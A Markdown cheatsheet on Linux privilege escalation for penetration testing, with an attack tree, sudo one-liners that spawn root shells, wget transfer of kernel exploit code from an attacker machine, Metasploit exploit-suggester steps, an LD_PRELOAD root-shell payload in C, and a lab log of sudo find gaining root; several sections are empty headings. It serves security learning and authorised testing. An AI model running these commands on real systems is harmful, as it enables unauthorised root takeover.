# Privilege escalation on Linux

## Attack tree

```text
2 Become root on Linux
    2.1 Find an exploit (software bug) in the operating system or other system services, for example a kernel exploit (OR)
        2.1.1 Detect vulnerabilities (AND)
        2.1.2 Develop or acquire exploit code (AND)
        2.1.3 Transfer the exploit to the target machine (AND)
        2.1.4 Execute the exploit on the target
    2.2 Find a misconfiguration in an existing legitimate tool, for example sudo
        2.2.1 Find which commands current user is allowed to use (sudo -l) (AND)
        2.2.2 Exploit the parameters of a command that is allowed to be executed with root permissions
            2.2.2.1 sudo find /etc/passwd -exec /bin/sh \; (OR)
            2.2.2.2 sudo vim -c '!sh' (OR)
            2.2.2.3 sudo awk 'BEGIN {system(“/bin/sh”)}' (OR)
            2.2.2.4 Other commands that are allowed to be executed with root permissions to invoke a shell
    2.3 Other privilege escalation
```

## Examples

### Kernel exploit CVE-2015-1328

For [CVE-2015-1328](https://ubuntu.com/security/CVE-2015-1328) exploit-db lists several possible exploits:

* [37292](https://www.exploit-db.com/exploits/37292)
* [37293](https://www.exploit-db.com/exploits/37293)
* [40688](https://www.exploit-db.com/exploits/40688) <= Metasploit, maybe there are other exploits too

#### Using 37292

1. Create a local file `37292.c` in the `/tmp/` directory and paste the code in the file
2. Start a local python http server: `python -m http.server 8080`
3. From the target machine: `wget http://<IP address attack machine>:8888/37292.c`
4. Compile on target machine: `gcc CVE-2015-1328.c -o 37292`
5. Make executable: `chmod +x 37292`
6. Check current user: `id`
7. Run the compiled exploit: `./exp`
8. Check current user: `id`

#### Using 40688

1. Upgrade existing shell (meterpreter, ssh, or a basic command shell) to `meterpreter` session

Open a new meterpreter session with:

```text
sessions -u <number>
```

Or upgrade the most recently opened session to meterpreter:

```text
sessions -u -1
```

2. Load the `local_exploit_suggester` module in `msfconsole`: 

```text
meterpreter> use post/multi/recon/local_exploit_suggester
```

3. Set the SESSION option for the module to the session ID of the meterpreter session, and `run`
4. Test the exploit modules recommended by `local_exploit_suggester`. The first few modules in the output usually 
have a higher chance of working successfully.
5. Load a module, set the module options and `exploit`
6. An exploit can fail for many reasons. If not works, try the next one or install missing components for it to run.

### Sudo exploits

#### LD_PRELOAD

`LD_PRELOAD` allows program to use/load shared libraries. If the `env_keep` option is enabled we can generate a 
shared library which will be loaded and executed before the program is run. The `LD_PRELOAD` option will be ignored 
if the real user ID is different from the effective user ID.

1. Check for `env_keep+=LD_PRELOAD` (using `sudo -l`)
2. Write a simple C code compiled as a share object (`.so` extension) file

```text
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Save as shell.c and compile:

    gcc -fPIC -shared -o shell.so shell.c -nostartfiles

Use this shared object file when launching any program the user can run with sudo.

3. Run the program with sudo rights and the `LD_PRELOAD` option pointing to the `.so` file

    sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

This will result in a shell spawn with root privileges.

#### Another find

Another [find in GTFObins](https://gtfobins.github.io/gtfobins/find/) for escalating privileges with `find`:

```text
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
...
$ sudo -l
Matching Defaults entries for karen on ip-10-10-0-32:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-0-32:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

### SUID exploits

### Capabilities exploits

### Cron jobs exploits

### Path exploits

### NFS exploits

## Notes

* In horizontal privilege escalation an adversary expands privileges by taking over another account.
* In vertical privilege escalation an attacker attempts to gain more permissions or access with an existing compromised account.

### Kernel exploits

A failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of 
the penetration testing engagement before attempting a kernel exploit. 

Kernel exploit methodology:

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and 
wget respectively. 

### Sudo exploits

The `sudo` command, by default, allows for running a program with root privileges. System administrators sometimes 
give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap 
but would not be cleared for full root access. The system administrator can allow this user to only run Nmap with 
root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

Use GTFObins for gathering information on how any program, on which a user may have sudo rights, can be used. 

### SUID exploits

### Capabilities exploits

### Cron jobs exploits

### Path exploits

### NFS exploits

## Tools exploits

* [LinEnum](https://github.com/rebootuser/LinEnum)
* [PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) is a script that searches for possible paths to escalate privileges on Linux/Unix* hosts. It also enumerates the system.
* [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) returns a list of possible CVEs, exploits, and exploit POCs (Proof of Concept) for the running Linux kernel.
* [GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.
* [Traitor](https://github.com/liamg/traitor) takes advantage of local misconfigurations and vulnerabilities (including most of GTFOBins) in order to pop a root shell. These are primarily misconfigurations, not exploits.

## Resources

* [Linux post exploitation enumeration](cheatsheets:docs/enumeration/linux-post)
* [GTFObins](https://gtfobins.github.io/)